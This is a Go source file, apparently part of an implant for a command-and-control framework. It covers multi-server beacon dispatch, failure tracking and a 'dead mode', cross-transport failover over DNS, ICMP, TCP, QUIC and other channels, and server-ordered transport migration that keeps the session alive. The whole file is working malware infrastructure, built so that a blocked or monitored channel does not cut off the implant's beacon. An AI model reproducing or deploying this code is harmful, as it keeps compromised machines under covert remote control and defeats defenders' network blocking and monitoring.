//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/r0si/sovereign/pkg/protocol"
)

// ?? Multi-C2 mode dispatch ???????????????????????????????????????????????

func sendWithMode(body []byte) []byte {
	urls := c2URLsSnapshot()
	if atomic.LoadInt32(&deadMode) == 1 {
		if time.Since(deadModeStart) > deadTimeout {
			atomic.StoreInt32(&deadMode, 0)
			if Debug {
				fmt.Println("[c2] Dead mode timeout expired, retrying...")
			}
		} else {
			return nil
		}
	}

	switch c2Mode {
	case C2ModeFailover:
		for i := 0; i < len(urls); i++ {
			idx := (int(currentC2Idx.Load()) + i) % len(urls)
			resp := sendToC2(idx, body)
			if resp != nil {
				recordSuccess(idx)
				currentC2Idx.Store(int32(idx))
				return resp
			}
			recordFailure(idx)
		}
		checkAllDead()
		return nil

	case C2ModeRoundRobin:
		currentC2Idx.Store(int32((int(currentC2Idx.Load()) + 1) % len(urls)))
		resp := sendToC2(int(currentC2Idx.Load()), body)
		if resp != nil {
			recordSuccess(int(currentC2Idx.Load()))
			return resp
		}
		recordFailure(int(currentC2Idx.Load()))
		checkAllDead()
		return nil

	case C2ModeRandom:
		idx := rng.Intn(len(urls))
		currentC2Idx.Store(int32(idx))
		resp := sendToC2(idx, body)
		if resp != nil {
			recordSuccess(idx)
			return resp
		}
		recordFailure(idx)
		return nil

	case C2ModeSplit:
		bestIdx := 0
		bestFails := int(^uint(0) >> 1)
		for i := range urls {
			c2StatsMu.Lock()
			stats := c2Stats[i]
			c2StatsMu.Unlock()
			fails := 0
			if stats != nil {
				fails = stats.consecutive
			}
			if fails < bestFails {
				bestFails = fails
				bestIdx = i
			}
		}
		currentC2Idx.Store(int32(bestIdx))
		resp := sendToC2(bestIdx, body)
		if resp != nil {
			recordSuccess(bestIdx)
			return resp
		}
		recordFailure(bestIdx)
		checkAllDead()
		return nil

	case C2ModeParallel:
		type parResp struct {
			data []byte
			idx  int
		}
		ch := make(chan parResp, len(urls))
		for i := range urls {
			idx := i
			go func() {
				data := sendToC2(idx, body)
				ch <- parResp{data, idx}
			}()
		}
		hasFailure := false
		for i := 0; i < len(urls); i++ {
			r := <-ch
			if r.data != nil {
				recordSuccess(r.idx)
				currentC2Idx.Store(int32(r.idx))
				return r.data
			}
			recordFailure(r.idx)
			hasFailure = true
		}
		if hasFailure {
			checkAllDead()
		}
		return nil

	default:
		resp := sendToC2(int(currentC2Idx.Load()), body)
		if resp != nil {
			recordSuccess(int(currentC2Idx.Load()))
			return resp
		}
		recordFailure(int(currentC2Idx.Load()))
		checkAllDead()
		return nil
	}
}

func recordFailure(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures++
	stats.consecutive++
	stats.lastFailure = time.Now()
}

func recordSuccess(idx int) {
	c2StatsMu.Lock()
	defer c2StatsMu.Unlock()
	if c2Stats == nil {
		return
	}
	stats := c2Stats[idx]
	if stats == nil {
		stats = &c2FailStats{}
		c2Stats[idx] = stats
	}
	stats.failures = 0
	stats.consecutive = 0
}

func checkAllDead() {
	urls := c2URLsSnapshot()
	if len(urls) == 0 || maxRetries <= 0 {
		return
	}
	c2StatsMu.Lock()
	allDead := true
	for i := range urls {
		stats := c2Stats[i]
		if stats == nil || stats.consecutive < maxRetries {
			allDead = false
			break
		}
	}
	if allDead {
		atomic.StoreInt32(&deadMode, 1)
		deadModeStart = time.Now()
		if Debug {
			fmt.Println("[!] All C2s unreachable, entering dead mode")
		}
	}
	c2StatsMu.Unlock()
}

// Cross-transport failover. If the active transport keeps failing, rotate to
// the next configured transport (HTTP<->DNS<->TCP<->ICMP) so a blocked or
// monitored channel cannot silently kill the beacon. Candidates are derived
// from what the agent actually has configured, so we never switch to a
// transport that lacks its setup (e.g. DNS without a DNSDomain/DNSServer).
var (
	transportFailStreak   int32
	currentTransportIdx   int32
	transportCandidates   []string
	transportCandidatesMu sync.Mutex
)

func effectiveTransport() string {
	curProto, curBT := getProtocol(), getBeaconTransport()
	switch {
	case curProto == "tcp":
		return "tcp"
	case curProto == "dns":
		return "dns"
	case curProto == "icmp":
		return "icmp"
	case curProto == "udp":
		return "udp"
	case curProto == "quic" || curBT == "quic":
		return "quic"
	case curBT == "wss":
		return "wss"
	case curBT == "grpc":
		return "grpc"
	case curBT == "ssh":
		return "ssh"
	case curBT == "mtls":
		return "mtls"
	case curBT == "h2c":
		return "h2c"
	default:
		return "http"
	}
}

func buildTransportCandidates() []string {
	primary := effectiveTransport()
	cands := []string{primary}
	add := func(t string) {
		if !c2SecureOnlyTransportAllowed(t) {
			return
		}
		for _, c := range cands {
			if c == t {
				return
			}
		}
		cands = append(cands, t)
	}
	// Only advertise a transport when the implant actually has a matching
	// endpoint (or, for DNS, dedicated domain/server config). Unconditional
	// TCP/ICMP fallback against an HTTP listener dials the wrong framing.
	if urlListHasTransport("http") || primary == "http" || (DNSDomain != "" && DNSServer != "") {
		add("http")
	}
	if DNSDomain != "" && DNSServer != "" {
		add("dns")
	}
	if urlListHasTransport("tcp") || primary == "tcp" {
		add("tcp")
	}
	if urlListHasTransport("icmp") || primary == "icmp" {
		add("icmp")
	}
	if urlListHasTransport("udp") || primary == "udp" {
		add("udp")
	}
	if urlListHasTransport("quic") || primary == "quic" {
		add("quic")
	}
	return cands
}

func getTransportCandidates() []string {
	transportCandidatesMu.Lock()
	defer transportCandidatesMu.Unlock()
	if transportCandidates == nil {
		transportCandidates = buildTransportCandidates()
	}
	return transportCandidates
}

// applyTransport switches the active transport by setting the globals the
// beacon dispatcher keys on. In secure-only mode a cleartext transport is
// refused: downgrading after a TLS failure is the attack we are preventing.
func applyTransport(name string) {
	if !c2SecureOnlyTransportAllowed(name) {
		if Debug {
			fmt.Printf("[c2] transport switch to %s refused: all configured C2 URLs are encrypted\n", name)
		}
		return
	}
	switch name {
	case "tcp":
		setProtocolAndTransport("tcp", "tcp")
	case "dns":
		setProtocolAndTransport("dns", "dns")
	case "icmp":
		setProtocolAndTransport("icmp", "icmp")
	case "udp":
		setProtocolAndTransport("udp", "udp")
	case "quic":
		setProtocolAndTransport("quic", "quic")
	default:
		name = "http"
		setProtocolAndTransport("http", "http")
	}
	if idx, ok := indexOfTransportURL(name); ok {
		currentC2Idx.Store(int32(idx))
	}
}

// validateTransportMigration is the implant's own gate on a server-provided
// switch. The response is AEAD-authenticated, but a valid frame from a server
// with a bad config must still not steer the agent to an unsupported scheme or
// a transport it has no endpoint for.
func validateTransportMigration(m *protocol.TransportMigration) (protocol.TransportMigration, error) {
	if m == nil {
		return protocol.TransportMigration{}, fmt.Errorf("no migration supplied")
	}
	transport := strings.ToLower(strings.TrimSpace(m.Transport))
	if transport == "" || !urlListHasTransport(transport) && !supportedBeaconTransport(transport) {
		return protocol.TransportMigration{}, fmt.Errorf("unsupported transport %q", m.Transport)
	}
	target := strings.TrimSpace(m.C2URL)
	if target != "" {
		if !hasValidC2Scheme(target) {
			return protocol.TransportMigration{}, fmt.Errorf("migration c2_url has an unsupported scheme")
		}
		parsed, err := url.Parse(target)
		if err != nil || parsed.Host == "" {
			return protocol.TransportMigration{}, fmt.Errorf("migration c2_url is not absolute")
		}
		if !schemeMatchesTransport(strings.ToLower(parsed.Scheme), transport) {
			return protocol.TransportMigration{}, fmt.Errorf("transport %q cannot dial a %s URL", transport, parsed.Scheme)
		}
	}
	return protocol.TransportMigration{Transport: transport, C2URL: target}, nil
}

// supportedBeaconTransport names the transports an agent can switch to even
// before a URL of that scheme exists; the caller separately requires an
// endpoint (configured or supplied by the migration) before applying.
func supportedBeaconTransport(name string) bool {
	switch name {
	case "http", "https", "tcp", "tls", "udp", "quic", "icmp", "ws", "wss",
		"grpc", "grpcs", "ssh", "mtls", "h2c", "dns", "smb":
		return true
	}
	return false
}

// applyTransportMigration switches the beacon transport without re-enrolling:
// ECDH session, frame sequence, registration marker and the pending-result
// queue are intentionally untouched, so the very next beacon continues the
// same authenticated session over the new transport.
func applyTransportMigration(m *protocol.TransportMigration) error {
	validated, err := validateTransportMigration(m)
	if err != nil {
		return err
	}
	if validated.C2URL != "" {
		existing := c2URLsSnapshot()
		if len(existing) == 0 {
			existing = splitC2URLList(C2URL)
		}
		c2URLsStore(mergeServerC2URL(validated.C2URL, existing), 0)
	}
	if _, ok := indexOfTransportURL(validated.Transport); !ok {
		return fmt.Errorf("no %s endpoint is configured for the migration", validated.Transport)
	}
	applyTransport(validated.Transport)
	if Debug {
		fmt.Printf("[c2] migration -> %s (session preserved)\n", validated.Transport)
	}
	return nil
}

// maybeRotateTransport is invoked after a failed beacon. Once the consecutive
// failure count reaches the threshold it advances to the next candidate and
// resets the counter. noteTransportSuccess clears the counter on any success.
func maybeRotateTransport() {
	streak := atomic.AddInt32(&transportFailStreak, 1)
	if streak < dnsFallbackThreshold {
		return
	}
	cands := getTransportCandidates()
	if len(cands) <= 1 {
		atomic.StoreInt32(&transportFailStreak, 0)
		return
	}
	cur := effectiveTransport()
	idx := int(atomic.LoadInt32(&currentTransportIdx))
	next := cur
	for i := 0; i < len(cands); i++ {
		idx = (idx + 1) % len(cands)
		candidate := cands[idx]
		if candidate != cur && c2SecureOnlyTransportAllowed(candidate) {
			next = candidate
			break
		}
	}
	atomic.StoreInt32(&currentTransportIdx, int32(idx))
	applyTransport(next)
	atomic.StoreInt32(&transportFailStreak, 0)
	if Debug {
		fmt.Printf("[c2] transport failover -> %s after %d consecutive failures\n", next, streak)
	}
}

func noteTransportSuccess() {
	atomic.StoreInt32(&transportFailStreak, 0)
}
